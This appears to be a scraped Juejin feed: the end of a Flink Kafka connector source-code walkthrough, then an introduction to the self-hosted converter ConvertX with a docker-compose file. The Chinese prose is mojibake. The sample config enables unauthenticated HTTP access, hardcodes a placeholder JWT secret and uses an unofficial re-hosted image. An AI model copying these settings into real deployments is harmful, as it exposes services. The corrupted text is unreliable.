<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> Collection&lt;KafkaCommittable&gt; <span class="hljs-title function_">prepareCommit</span><span class="hljs-params">()</span> {
    <span class="hljs-comment">// only return a KafkaCommittable if the current transaction has been written some data</span>
    <span class="hljs-keyword">if</span> (currentProducer.hasRecordsInTransaction()) {
        <span class="hljs-type">KafkaCommittable</span> <span class="hljs-variable">committable</span> <span class="hljs-operator">=</span> KafkaCommittable.of(currentProducer);
        LOG.debug(<span class="hljs-string">"Prepare {}."</span>, committable);
        currentProducer.precommitTransaction();
        <span class="hljs-keyword">return</span> Collections.singletonList(committable);
    }

    <span class="hljs-comment">// otherwise, we recycle the producer (the pool will reset the transaction state)</span>
    producerPool.recycle(currentProducer);
    <span class="hljs-keyword">return</span> Collections.emptyList();
}
</code></pre>
<p>çŠ¶æ€ä¿å­˜æ—¶ï¼Œä¼šå°†é¢„æäº¤çš„ transactionalId å­˜åˆ°çŠ¶æ€ä¸­ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> List&lt;KafkaWriterState&gt; <span class="hljs-title function_">snapshotState</span><span class="hljs-params">(<span class="hljs-type">long</span> checkpointId)</span> <span class="hljs-keyword">throws</span> IOException {
    <span class="hljs-comment">// recycle committed producers</span>
    TransactionFinished finishedTransaction;
    <span class="hljs-keyword">while</span> ((finishedTransaction = backchannel.poll()) != <span class="hljs-literal">null</span>) {
        producerPool.recycleByTransactionId(
                finishedTransaction.getTransactionId(), finishedTransaction.isSuccess());
    }
    <span class="hljs-comment">// persist the ongoing transactions into the state; these will not be aborted on restart</span>
    Collection&lt;CheckpointTransaction&gt; ongoingTransactions =
            producerPool.getOngoingTransactions();
    currentProducer = startTransaction(checkpointId + <span class="hljs-number">1</span>);
    <span class="hljs-keyword">return</span> createSnapshots(ongoingTransactions);
}

<span class="hljs-keyword">private</span> List&lt;KafkaWriterState&gt; <span class="hljs-title function_">createSnapshots</span><span class="hljs-params">(
        Collection&lt;CheckpointTransaction&gt; ongoingTransactions)</span> {
    List&lt;KafkaWriterState&gt; states = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
    <span class="hljs-type">int</span>[] subtaskIds = <span class="hljs-built_in">this</span>.ownedSubtaskIds;
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">index</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; index &lt; subtaskIds.length; index++) {
        <span class="hljs-type">int</span> <span class="hljs-variable">ownedSubtask</span> <span class="hljs-operator">=</span> subtaskIds[index];
        states.add(
                <span class="hljs-keyword">new</span> <span class="hljs-title class_">KafkaWriterState</span>(
                        transactionalIdPrefix,
                        ownedSubtask,
                        totalNumberOfOwnedSubtasks,
                        transactionNamingStrategy.getOwnership(),
                        <span class="hljs-comment">// new transactions are only created with the first owned subtask id</span>
                        index == <span class="hljs-number">0</span> ? ongoingTransactions : List.of()));
    }
    LOG.debug(<span class="hljs-string">"Snapshotting state {}"</span>, states);
    <span class="hljs-keyword">return</span> states;
}
</code></pre>
<p>å½“ Checkpoint å®Œæˆæ—¶ï¼Œä¼šè°ƒç”¨ <code>KafkaCommitter.commit</code> æ–¹æ³•ã€‚åœ¨ commit æ–¹æ³•ä¸­ä¼šè°ƒç”¨ <code>producer.commitTransaction</code> æ­£å¼æäº¤äº‹åŠ¡ã€‚</p>
<p>FlinkKafkaInternalProducer æ˜¯ Flink å†…éƒ¨å°è£…çš„ä¸ Kafka ç”Ÿäº§è€…çš„äº¤äº’ç±»ï¼Œæ‰€æœ‰ä¸ Kafka ç”Ÿäº§è€…çš„äº¤äº’éƒ½é€šè¿‡å®ƒæ‰§è¡Œã€‚</p>
<p>å…³äº Kafka Connector çš„ Sink ç«¯çš„æºç æˆ‘ä»¬å°±æ¢³ç†åˆ°è¿™é‡Œã€‚</p>
<h3 data-id="heading-9">æ€»ç»“</h3>
<p>æœ€åè¿˜æ˜¯æ€»ç»“ä¸€ä¸‹ã€‚æœ¬æ–‡æˆ‘ä»¬å…ˆäº†è§£äº† Flink ä¸­è‡ªå®šä¹‰ Source å’Œ Sink çš„æµç¨‹ã€‚æŒ‰ç…§è¿™ä¸ªæµç¨‹ï¼Œæˆ‘ä»¬æ¢³ç†äº† Kafka Connector çš„æºç ã€‚åœ¨ Source ç«¯ï¼ŒFlink Kafka å°è£…äº†å¯¹æ¶ˆè´¹è€… Offset çš„æäº¤é€»è¾‘ã€‚åœ¨ Sink ç«¯ç»“åˆäº† Kafka æä¾›çš„äº‹åŠ¡æ”¯æŒå®ç°äº†ä¸¤é˜¶æ®µæäº¤çš„é€»è¾‘ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ConvertX:ä¸€ç«™å¼è‡ªæ‰˜ç®¡åœ¨çº¿æ–‡ä»¶è½¬æ¢å¹³å°,æ”¯æŒä¸Šåƒç§æ ¼å¼]]></title>    <link>https://juejin.cn/post/7597283981185302580</link>    <guid>https://juejin.cn/post/7597283981185302580</guid>    <pubDate>2026-01-20T15:27:48.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597283981185302580" data-draft-id="7597326073671696399" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ConvertX:ä¸€ç«™å¼è‡ªæ‰˜ç®¡åœ¨çº¿æ–‡ä»¶è½¬æ¢å¹³å°,æ”¯æŒä¸Šåƒç§æ ¼å¼"/> <meta itemprop="keywords" content="å¼€æº"/> <meta itemprop="datePublished" content="2026-01-20T15:27:48.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ä¿®å·±xj"/> <meta itemprop="url" content="https://juejin.cn/user/2641475936724142"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ConvertX:ä¸€ç«™å¼è‡ªæ‰˜ç®¡åœ¨çº¿æ–‡ä»¶è½¬æ¢å¹³å°,æ”¯æŒä¸Šåƒç§æ ¼å¼
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2641475936724142/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ä¿®å·±xj
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T15:27:48.000Z" title="Tue Jan 20 2026 15:27:48 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>ä½ æ˜¯å¦æ›¾ç»ä¸ºäº†è½¬æ¢ä¸€ä¸ªæ–‡ä»¶æ ¼å¼ï¼Œåœ¨ç”µè„‘ä¸Šå®‰è£…å„ç§è‡ƒè‚¿çš„è½¯ä»¶ï¼Œæˆ–è€…å°†æ•æ„Ÿæ–‡ä»¶ä¸Šä¼ åˆ°ç¬¬ä¸‰æ–¹åœ¨çº¿è½¬æ¢ç½‘ç«™ï¼Ÿå¦‚æœä½ æ­£åœ¨å¯»æ‰¾ä¸€ä¸ªæ—¢èƒ½ä¿æŠ¤éšç§ã€åˆèƒ½æ»¡è¶³å¤šæ ·åŒ–è½¬æ¢éœ€æ±‚çš„è‡ªæ‰˜ç®¡è§£å†³æ–¹æ¡ˆï¼Œé‚£ä¹ˆ <strong>ConvertX</strong> å°±æ˜¯ä¸ºä½ é‡èº«æ‰“é€ çš„å·¥å…·ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/15f6b2448cc9445f9d75f3b7a3f5422c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L-u5bexeGo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769527667&amp;x-signature=lL6fsv%2F5SE66WalF0UHKsf9psT8%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-0">ğŸ’¥ä»€ä¹ˆæ˜¯ ConvertXï¼Ÿ</h2>
<p>ConvertX æ˜¯ä¸€ä¸ªåŠŸèƒ½å¼ºå¤§çš„è‡ªæ‰˜ç®¡åœ¨çº¿æ–‡ä»¶è½¬æ¢å™¨ã€‚å®ƒæœ€å¤§çš„äº®ç‚¹æ˜¯ <strong>æ”¯æŒè¶…è¿‡ä¸€åƒç§ä¸åŒçš„æ–‡ä»¶æ ¼å¼è½¬æ¢</strong>ï¼Œæ¶µç›–äº†æ–‡æ¡£ã€å›¾åƒã€è§†é¢‘ã€ç”µå­ä¹¦ã€3Dæ¨¡å‹ç­‰å¤šç§ç±»å‹ã€‚è¯¥é¡¹ç›®é‡‡ç”¨ TypeScriptã€Bun å’Œ Elysia ç­‰ç°ä»£æŠ€æœ¯æ ˆå¼€å‘ï¼Œæ—¨åœ¨ä¸ºç”¨æˆ·æä¾›ä¸€ä¸ªå®‰å…¨ã€é«˜æ•ˆã€å¯å®Œå…¨æŒæ§çš„æœ¬åœ°åŒ–æ–‡ä»¶å¤„ç†ä¸­å¿ƒã€‚</p>
<p>githubåœ°å€ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FC4illin%2FConvertX" target="_blank" title="https://github.com/C4illin/ConvertX" ref="nofollow noopener noreferrer">github.com/C4illin/Conâ€¦</a></p>
<p>è¯¥é¡¹ç›®åœ¨github å·²æœ‰15.3k â­star</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cd5050a58bae45e2b6d5def2beb1f798~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L-u5bexeGo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769527667&amp;x-signature=%2F6IX8CnFDJs6nnPqDKgI%2Bi%2BtU%2F0%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-1">â˜€ï¸ æ ¸å¿ƒç‰¹æ€§</h2>
<ul>
<li><strong>æµ·é‡æ ¼å¼æ”¯æŒï¼š</strong> æ”¯æŒä¸Šåƒç§æ ¼å¼äº’è½¬ï¼Œå‡ ä¹èƒ½æ»¡è¶³æ‰€æœ‰æ—¥å¸¸åŠä¸“ä¸šéœ€æ±‚ã€‚</li>
<li><strong>æ‰¹é‡å¤„ç†ï¼š</strong> å¯ä»¥ä¸€æ¬¡æ€§ä¸Šä¼ å¹¶è½¬æ¢å¤šä¸ªæ–‡ä»¶ï¼Œæ˜¾è‘—æå‡å·¥ä½œæ•ˆç‡ã€‚</li>
<li><strong>éšç§å®‰å…¨ï¼š</strong> è‡ªæ‰˜ç®¡æ„å‘³ç€ä½ çš„æ–‡ä»¶æ•°æ®æ°¸è¿œä¸ä¼šç¦»å¼€ä½ è‡ªå·±çš„æœåŠ¡å™¨ï¼Œéå¸¸é€‚åˆå¤„ç†æ•æ„Ÿæˆ–æœºå¯†æ–‡æ¡£ã€‚</li>
<li><strong>å¤šç”¨æˆ·è´¦æˆ·ï¼š</strong> æ”¯æŒä¸ºå›¢é˜Ÿæˆå‘˜æˆ–å®¶åº­æˆå‘˜åˆ›å»ºç‹¬ç«‹çš„è´¦æˆ·ï¼Œå…±äº«æœåŠ¡åˆä¿æŒä¸ªäººæ–‡ä»¶å†å²éš”ç¦»ã€‚</li>
<li><strong>å¼€æºå…è´¹ï¼š</strong> å®Œå…¨å¼€æºï¼Œä»£ç é€æ˜ï¼Œå¯è‡ªç”±éƒ¨ç½²å’Œä¿®æ”¹ã€‚</li>
</ul>
<h2 data-id="heading-2">ğŸ å¼ºå¤§çš„è½¬æ¢å¼•æ“é˜µå®¹</h2>
<p>ConvertX çš„å¼ºå¤§èƒ½åŠ›æºäºå…¶èƒŒåæ•´åˆçš„ä¼—å¤šä¸šç•ŒçŸ¥åçš„å¼€æºè½¬æ¢å·¥å…·ï¼Œå®ƒä»¬å…±åŒæ„æˆäº†ä¸€ä¸ªè¶…çº§è½¬æ¢å·¥å‚ï¼š</p>

































































<table><thead><tr><th>å·¥å…·</th><th>ç”¨é€”</th><th>æ”¯æŒè¾“å…¥æ ¼å¼æ•°</th><th>æ”¯æŒè¾“å‡ºæ ¼å¼æ•°</th></tr></thead><tbody><tr><td><strong>FFmpeg</strong></td><td>éŸ³è§†é¢‘å¤„ç†</td><td>~472ç§</td><td>~199ç§</td></tr><tr><td><strong>ImageMagick / GraphicsMagick</strong></td><td>å›¾åƒå¤„ç†</td><td>412ç§</td><td>313ç§</td></tr><tr><td><strong>LibreOffice</strong></td><td>åŠå…¬æ–‡æ¡£</td><td>41ç§</td><td>22ç§</td></tr><tr><td><strong>Pandoc</strong></td><td>æ–‡æ¡£æ ¼å¼ï¼ˆå¦‚Markdownï¼‰</td><td>43ç§</td><td>65ç§</td></tr><tr><td><strong>Calibre</strong></td><td>ç”µå­ä¹¦</td><td>26ç§</td><td>19ç§</td></tr><tr><td><strong>Inkscape</strong></td><td>çŸ¢é‡å›¾å½¢</td><td>7ç§</td><td>17ç§</td></tr><tr><td><strong>Assimp</strong></td><td>3Dæ¨¡å‹èµ„äº§</td><td>77ç§</td><td>23ç§</td></tr><tr><td><strong>Vips / libheif / libjxl</strong></td><td>é«˜æ€§èƒ½å›¾åƒä¸HEIF/JPEG XLæ ¼å¼</td><td>58ç§</td><td>38ç§</td></tr><tr><td>... ä»¥åŠæ›´å¤š</td><td>åŒ…æ‹¬ SVGã€LaTeXã€Outlooké‚®ä»¶ã€è”ç³»äººæ–‡ä»¶ç­‰</td><td/><td/></tr></tbody></table>
<p>è¿™ä¸ªåˆ—è¡¨æ¸…æ™°åœ°å±•ç¤ºäº† ConvertX çš„æ ¼å¼è¦†ç›–å¹¿åº¦ã€‚æ— è®ºæ˜¯å¸¸è§çš„ <code>.pdf</code>ã€<code>.docx</code>ã€<code>.mp4</code>ã€<code>.jpg</code>ï¼Œè¿˜æ˜¯ç›¸å¯¹å°ä¼—çš„æ ¼å¼ï¼Œå®ƒéƒ½æœ‰å¾ˆå¤§å¯èƒ½æ”¯æŒã€‚</p>
<h2 data-id="heading-3">ğŸï¸å¿«é€Ÿéƒ¨ç½²æŒ‡å—</h2>
<p>ä½¿ç”¨ Docker éƒ¨ç½² ConvertX æ˜¯æå…¶ç®€å•çš„è¿‡ç¨‹ï¼Œåªéœ€å‡ åˆ†é’Ÿå³å¯æ‹¥æœ‰è‡ªå·±çš„è½¬æ¢æœåŠ¡ã€‚</p>
<ol>
<li><strong>å‡†å¤‡ <code>docker-compose.yml</code> æ–‡ä»¶ï¼š</strong></li>
</ol>

<pre><code class="hljs language-ini" lang="ini">services:
  convertx:
  <span class="hljs-comment"># æ­¤æœåŠ¡çš„é•œåƒ3.59GBï¼Œå›½å†…ä¸‹è½½æ¯”è¾ƒæ…¢ï¼Œéœ€è¦çš„å®¶äººä»¬å¯ä»¥ä½¿ç”¨æˆ‘è½¬å­˜é˜¿é‡Œäº‘é•œåƒä»“åº“çš„é•œåƒ</span>
    image: registry.cn-hangzhou.aliyuncs.com/xjpublic/convertx
    container_name: convertx
    restart: unless-stopped
    ports:
      - "10000:3000"
    environment: 
      - <span class="hljs-attr">ACCOUNT_REGISTRATION</span>=<span class="hljs-literal">false</span> <span class="hljs-comment"># trueæˆ–falseï¼Œé¦–è´¦æˆ·åˆ›å»ºä¸å—å½±å“ï¼ˆä¾‹å¦‚è‹¥åªéœ€å•è´¦æˆ·å¯ä¿æŒfalseï¼‰</span>
      - <span class="hljs-attr">JWT_SECRET</span>=aLongAndSecretStringUsedToSignTheJSONWebToken1234 <span class="hljs-comment"># é»˜è®¤ä½¿ç”¨randomUUID()ç”Ÿæˆ</span>
      - <span class="hljs-attr">HTTP_ALLOWED</span>=<span class="hljs-literal">true</span> <span class="hljs-comment"># è‹¥è¦ä½¿ç”¨httpè®¿é—®ï¼Œåˆ™è®¾ç½®ä¸ºtrue</span>
      - <span class="hljs-attr">ALLOW_UNAUTHENTICATED</span>=<span class="hljs-literal">true</span>  <span class="hljs-comment"># å…è®¸æœªç™»å½•ç”¨æˆ·ä½¿ç”¨æœåŠ¡ï¼Œä»…é™æœ¬åœ°ç¯å¢ƒè®¾ä¸ºtrue</span>
      - <span class="hljs-attr">AUTO_DELETE_EVERY_N_HOURS</span>=<span class="hljs-number">24</span> <span class="hljs-comment"># æ¯Nå°æ—¶æ£€æŸ¥å¹¶åˆ é™¤è¶…è¿‡Nå°æ—¶çš„æ—§æ–‡ä»¶ï¼Œè®¾ä¸º0å¯ç¦ç”¨</span>
    volumes:
      - ./data:/app/data
</code></pre>
<p>ğŸ³<strong>Docker é•œåƒ</strong></p>
<p>æ¯æ¬¡å‘å¸ƒæ—¶ä¼šæ›´æ–° <code>:latest</code> æ ‡ç­¾ï¼Œæ¯æ¬¡æ¨é€åˆ°ä¸»åˆ†æ”¯æ—¶ä¼šæ›´æ–° <code>:main</code> æ ‡ç­¾ã€‚å¸¸è§„ä½¿ç”¨æ¨èä½¿ç”¨ <code>:latest</code> æ ‡ç­¾ã€‚</p>
<p>é•œåƒå¯åœ¨ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FC4illin%2FConvertX%2Fpkgs%2Fcontainer%2FConvertX" target="_blank" title="https://github.com/C4illin/ConvertX/pkgs/container/ConvertX" ref="nofollow noopener noreferrer">GitHub Container Registry</a> å’Œ <a href="https://link.juejin.cn?target=https%3A%2F%2Fhub.docker.com%2Fr%2Fc4illin%2Fconvertx" target="_blank" title="https://hub.docker.com/r/c4illin/convertx" ref="nofollow noopener noreferrer">Docker Hub</a> è·å–ã€‚</p>

























<table><thead><tr><th>é•œåƒ</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><code>image: ghcr.io/c4illin/convertx</code></td><td>GitHub Container Registry ä¸Šçš„æœ€æ–°å‘å¸ƒç‰ˆæœ¬</td></tr><tr><td><code>image: ghcr.io/c4illin/convertx:main</code></td><td>GitHub Container Registry ä¸Šçš„æœ€æ–°æäº¤</td></tr><tr><td><code>image: c4illin/convertx</code></td><td>Docker Hub ä¸Šçš„æœ€æ–°å‘å¸ƒç‰ˆæœ¬</td></tr><tr><td><code>image: c4illin/convertx:main</code></td><td>Docker Hub ä¸Šçš„æœ€æ–°æäº¤</td></tr></tbody></table>
<p>æ­¤æœåŠ¡çš„é•œåƒ3.59GBï¼Œå›½å†…ä¸‹è½½æ¯”è¾ƒæ…¢ï¼Œéœ€è¦çš„å®¶äººä»¬å¯ä»¥ä½¿ç”¨æˆ‘è½¬å­˜é˜¿é‡Œäº‘é•œåƒä»“åº“çš„é•œåƒ<code>registry.cn-hangzhou.aliyuncs.com/xjpublic/convertx</code></p>
<ol start="2">
<li>
<p><strong>å¯åŠ¨æœåŠ¡ï¼š</strong></p>
<p>åœ¨ <code>docker-compose.yml</code> æ–‡ä»¶æ‰€åœ¨ç›®å½•ä¸‹è¿è¡Œï¼š</p>
</li>
</ol>

<pre><code class="hljs">docker-compose up -d
</code></pre>
<p>3.  <strong>åˆå§‹åŒ–è´¦æˆ·ï¼š</strong> åœ¨æµè§ˆå™¨ä¸­è®¿é—® <code>http://ä½ çš„æœåŠ¡å™¨IP:3000</code>ã€‚<strong>ç¬¬ä¸€ä¸ªæ³¨å†Œçš„ç”¨æˆ·å°†è‡ªåŠ¨æˆä¸ºç®¡ç†å‘˜</strong>ã€‚</p>
<p>å°±è¿™ä¹ˆç®€å•ï¼ä½ å·²ç»æˆåŠŸæ­å»ºäº†ä¸€ä¸ªåŠŸèƒ½å®Œå¤‡çš„åœ¨çº¿æ–‡ä»¶è½¬æ¢å¹³å°ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ea5e412ffef949c0b361cf4a406093d4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L-u5bexeGo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769527667&amp;x-signature=GGHqYDL9Q1atciNfvU7RE%2FWxW2A%3D" alt="" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1e959a7762eb45e7bf30d155dc3f513e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L-u5bexeGo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769527667&amp;x-signature=n5K9tEYwr%2FdvSY%2BM79RURKu%2BsRQ%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-4">ğŸ›ç¯å¢ƒå˜é‡</h3>
<p>æ‰€æœ‰å˜é‡å‡ä¸ºå¯é€‰ï¼Œä½†å»ºè®®è®¾ç½® JWT_SECRETã€‚</p>






































































<table><thead><tr><th>å˜é‡å</th><th>é»˜è®¤å€¼</th><th>æè¿°</th></tr></thead><tbody><tr><td>JWT_SECRET</td><td>æœªè®¾ç½®æ—¶ä½¿ç”¨ randomUUID() ç”Ÿæˆçš„å€¼</td><td>ç”¨äºç­¾å JSON Web Token çš„é•¿è€Œä¿å¯†çš„å­—ç¬¦ä¸²</td></tr><tr><td>ACCOUNT_REGISTRATION</td><td>false</td><td>æ˜¯å¦å…è®¸ç”¨æˆ·æ³¨å†Œè´¦æˆ·</td></tr><tr><td>HTTP_ALLOWED</td><td>false</td><td>æ˜¯å¦å…è®¸ HTTP è¿æ¥ï¼Œä»…åœ¨æœ¬åœ°ç¯å¢ƒä¸­è®¾ç½®ä¸º true</td></tr><tr><td>ALLOW_UNAUTHENTICATED</td><td>false</td><td>æ˜¯å¦å…è®¸æœªè®¤è¯ç”¨æˆ·ä½¿ç”¨æœåŠ¡ï¼Œä»…åœ¨æœ¬åœ°ç¯å¢ƒä¸­è®¾ç½®ä¸º true</td></tr><tr><td>AUTO_DELETE_EVERY_N_HOURS</td><td>24</td><td>æ¯éš” n å°æ—¶æ£€æŸ¥å¹¶åˆ é™¤è¶…è¿‡ n å°æ—¶çš„æ–‡ä»¶ï¼Œè®¾ç½®ä¸º 0 ä»¥ç¦ç”¨</td></tr><tr><td>WEBROOT</td><td/><td>æ ¹è·¯å¾„åœ°å€ï¼Œä¾‹å¦‚è®¾ç½®ä¸º "/convert" åï¼Œç½‘ç«™å°†é€šè¿‡ "example.com/convert/" è®¿é—®</td></tr><tr><td>FFMPEG_ARGS</td><td/><td>ä¼ é€’ç»™ ffmpeg è¾“å…¥æ–‡ä»¶çš„å‚æ•°ï¼Œä¾‹å¦‚ <code>-hwaccel vaapi</code>ã€‚æœ‰å…³ç¡¬ä»¶åŠ é€Ÿçš„æ›´å¤šä¿¡æ¯ï¼Œè¯·å‚é˜… <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FC4illin%2FConvertX%2Fissues%2F190%25E3%2580%2582" target="_blank" title="https://github.com/C4illin/ConvertX/issues/190%E3%80%82" ref="nofollow noopener noreferrer">github.com/C4illin/Conâ€¦</a></td></tr><tr><td>FFMPEG_OUTPUT_ARGS</td><td/><td>ä¼ é€’ç»™ ffmpeg è¾“å‡ºæ–‡ä»¶çš„å‚æ•°ï¼Œä¾‹å¦‚ <code>-preset veryfast</code></td></tr><tr><td>HIDE_HISTORY</td><td>false</td><td>æ˜¯å¦éšè—å†å²è®°å½•é¡µé¢</td></tr><tr><td>LANGUAGE</td><td>en</td><td>ç”¨äºæ ¼å¼åŒ–æ—¥æœŸå­—ç¬¦ä¸²çš„è¯­è¨€ï¼Œéœ€ä½¿ç”¨ [BCP 47 è¯­è¨€æ ‡ç­¾] 